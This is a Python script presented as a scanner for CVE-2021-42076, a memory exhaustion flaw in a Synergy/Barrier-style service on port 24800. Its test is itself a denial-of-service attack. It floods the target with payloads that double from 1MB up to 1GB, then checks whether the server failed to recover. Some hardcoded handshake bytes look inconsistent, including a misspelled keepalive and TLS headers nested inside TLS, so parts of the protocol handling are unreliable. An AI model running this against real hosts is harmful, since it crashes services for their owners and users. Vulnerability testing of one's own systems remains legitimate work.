#!/usr/bin/env python3
"""
CVE-2021-42076: Memory Exhaustion Scanner
Tests for vulnerability to memory exhaustion via large messages
"""

import socket
import binascii
import time
import ssl
from utils import create_ssl_context, frame_message, normalize_host

def create_payload(size):
    """Create a message with specified size to test memory exhaustion"""
    return b"A" * size

def verify_server_recovery(host, port, timeout=5.0):
    """Verify if the server recovers after a test by attempting a new connection"""
    time.sleep(2)
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            context = create_ssl_context()
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                initial_hello = b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08"
                ssock.sendall(initial_hello)
                response = ssock.recv(4096)
                return bool(response)
    except Exception:
        return False

def scan(host, port=24800, start_size=1024*1024, max_size=1024*1024*1024):
    """Test for CVE-2021-42076 memory exhaustion vulnerability"""
    host = normalize_host(host)
    context = create_ssl_context()

    print(f"\nTesting CVE-2021-42076 - Memory exhaustion")
    print(f"Testing with payload sizes from {start_size/1024/1024:.1f}MB to {max_size/1024/1024:.1f}MB")
    
    initial_hello = b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08"
    barrier_hello = b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x42\x61\x72\x72\x69\x65\x72\x00\x01\x00\x08test\x00"
    keepalive = b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x53\x79\x6e\x72\x67\x79\x00\x01\x00\x08CALV\x00"
    
    current_size = start_size
    vulnerable = False
    while current_size <= max_size:
        try:
            with socket.create_connection((host, port), timeout=10.0) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    print("Establishing connection...")
                    ssock.sendall(initial_hello)
                    response = ssock.recv(4096)
                    if not response:
                        print("Failed to establish connection - no response")
                        return
                        
                    print("Sending barrier hello...")
                    ssock.sendall(barrier_hello)
                    try:
                        response = ssock.recv(4096)
                    except socket.timeout:
                        pass
                        
                    ssock.sendall(keepalive)
                    time.sleep(0.5)
                    
                    print(f"\nTesting with {current_size/1024/1024:.1f}MB payload...")
                    payload = create_payload(current_size)
                    framed_msg = frame_message(payload)
                    
                    sent = 0
                    chunk_size = 16384
                    while sent < len(framed_msg):
                        chunk = framed_msg[sent:sent + chunk_size]
                        ssock.sendall(chunk)
                        sent += len(chunk)
                        
                        if sent % (1024*1024) == 0:
                            print(f"Sent {sent/1024/1024:.1f}MB of {len(framed_msg)/1024/1024:.1f}MB")
                            ssock.sendall(keepalive)
                            time.sleep(0.1)
                    
                    try:
                        response = ssock.recv(4096)
                        if not response:
                            print("[!] Server closed connection after large message")
                            if not verify_server_recovery(host, port):
                                print("[!] Server failed to recover - likely vulnerable to CVE-2021-42076")
                                vulnerable = True
                                return
                            else:
                                print("[*] Server recovered - likely not vulnerable")
                    except socket.timeout:
                        print("[!] Server stopped responding after large message")
                        if not verify_server_recovery(host, port):
                            print("[!] Server failed to recover - likely vulnerable to CVE-2021-42076")
                            vulnerable = True
                            return
                        else:
                            print("[*] Server recovered - likely not vulnerable")
                    except ConnectionError:
                        print("[!] Connection lost after sending large message")
                        if not verify_server_recovery(host, port):
                            print("[!] Server failed to recover - likely vulnerable to CVE-2021-42076")
                            vulnerable = True
                            return
                        else:
                            print("[*] Server recovered - likely not vulnerable")
                        
            current_size *= 2
            time.sleep(1)
            
        except Exception as e:
            print(f"Error during test with {current_size/1024/1024:.1f}MB: {e}")
            if "Connection reset by peer" in str(e):
                if not verify_server_recovery(host, port):
                    print("[!] Server failed to recover - likely vulnerable to CVE-2021-42076")
                    vulnerable = True
                else:
                    print("[*] Server recovered - likely not vulnerable")
            break
    
    if not vulnerable:
        print("\n[*] Server appears not vulnerable to CVE-2021-42076")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='CVE-2021-42076 Memory Exhaustion Scanner')
    parser.add_argument('--host', required=True, help='Target hostname or IP address')
    parser.add_argument('--port', type=int, default=24800, help='Target port (default: 24800)')
    parser.add_argument('--start-size', type=int, default=1024*1024,
                        help='Starting payload size in bytes (default: 1MB)')
    parser.add_argument('--max-size', type=int, default=1024*1024*1024,
                        help='Maximum payload size in bytes (default: 1GB)')
    args = parser.parse_args()
    
    scan(args.host, args.port, args.start_size, args.max_size)